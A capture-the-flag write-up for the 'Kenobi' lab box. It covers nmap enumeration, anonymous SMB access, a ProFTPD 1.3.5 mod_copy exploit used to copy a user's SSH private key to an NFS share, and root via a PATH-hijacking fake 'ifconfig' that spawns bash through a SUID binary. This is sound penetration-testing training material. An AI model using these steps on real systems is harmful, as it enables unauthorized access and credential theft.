# Kenobi

***
![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/ab53e317-4530-4bf2-8910-6defd55ec680)

## **Difficulty = Easy**

***

Running our nmap scan we have


```
# Nmap 7.94SVN scan initiated Fri Feb  9 14:14:11 2024 as: nmap -p- -sCV -v --min-rate=1000 -T4 -oN nmap.txt 10.10.3.223
Increasing send delay for 10.10.3.223 from 0 to 5 due to 63 out of 156 dropped probes since last increase.
Increasing send delay for 10.10.3.223 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.10.3.223
Host is up (0.23s latency).
Not shown: 65442 filtered tcp ports (no-response), 87 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34373/udp6  mountd
|   100005  1,2,3      39727/tcp6  mountd
|   100005  1,2,3      49087/tcp   mountd
|   100005  1,2,3      60433/udp   mountd
|   100021  1,3,4      44331/tcp   nlockmgr
|   100021  1,3,4      45453/tcp6  nlockmgr
|   100021  1,3,4      54431/udp6  nlockmgr
|   100021  1,3,4      59904/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-02-09T07:16:42-06:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-09T13:16:42
|_  start_date: N/A
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  9 14:16:54 2024 -- 1 IP address (1 host up) scanned in 163.26 seconds
```



Checking port 80/HTTP we have this



![](https://i.imgur.com/MCIU09Z.png)




Checking port 139/445 SMB we have an anonymous share



![](https://i.imgur.com/enDBCOo.png)


We can go ahead and connect to it, in which we have a `log.txt` file, go ahead and download to our local machine


```bash
smbclient \\\\10.10.156.73\\anonymous

mget log.txt
```



![](https://i.imgur.com/aJBT4hi.png)



Checking the log file looks like some kind of FTP log, let enumerate ftp 



![](https://i.imgur.com/EH2C8Xa.png)



We can't connect via the anonymous user as the default password "`anonymous`", probably it has been changed



![](https://i.imgur.com/mYA5Al2.png)


Well, but lucky for us we have the version for the FTP server, **"ProFTPD 1.3.5 Server"**, Enumerating this version leads me to this [exploit](https://www.exploit-db.com/exploits/49908)



![](https://i.imgur.com/YCgoLzk.png)



Although we have to make some little changes to this exploit, by changing the `cpfr` which is copy from command path to `/home/kenobi/.ssh/id_rsa` and command `cpto` which is copy to `/var/tmp/id_rsa`



![](https://i.imgur.com/36pR6IT.png)


> I am sorry if i am a bit too forward but i have enumerated the NFS share already, i found out that there is a writable share on `/var/tmp` that is why i decided to specify it in our exploit, the `/home/kenobi/.ssh/id_rsa` is from the `log.txt` file, Remember :D 



Go ahead and run the exploit


```bash
python3 exploit.py 10.10.3.223
```



![](https://i.imgur.com/SzsC4BS.png)


Now mount the NFS share on port 111



```bash
showmount -e 10.10.156.73

sudo mount -t nfs 10.10.156.73:/var ./mnt
```



![](https://i.imgur.com/t4RhpJb.png)


Go ahead and switch to the mounted NFS, then copy the `id_rsa` to wherever you want, Just copy it!!!


![](https://i.imgur.com/DvsU32N.png)



Go ahead and login as user kenobi with the `id_rsa` file



![](https://i.imgur.com/lg6DB5s.png)


Running `find / -perm -4000 2>/dev/null` we have we have an unusual SUID binary `/usr/bin/menu`




![](https://i.imgur.com/VDNwrnm.png)



running this binary and choosing option 3 we can see that, the `ifconfig` binary is been ran, we can create our own `ifconfig` binary and use it to gain shell




![](https://i.imgur.com/70EwVlT.png)


We can go ahead and change directory to `/tmp`, create a file named `ifconfig`, grant it 777 permissions, export the `/tmp` path to PATH environment variable and run the `/usr/bin/menu` program selecting option 3 again and you should be root



```bash
# Create the file

cd /tmp
touch ifconfig
vim ifconfig

# COPY AND PASTE this

#!/bin/bash
/bin/bash -i

# HIT [ESC] key and then type in :wq to exit vim saving changes

# Export PATH

chmod 777 ifconfig
export PATH=/tmp:$PATH

# Run the program

/usr/bin/menu
3
```


![](https://i.imgur.com/oI6I0cB.png)


Just a milestone to the Offensive Security Path, Have a nice weekend 😄


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>



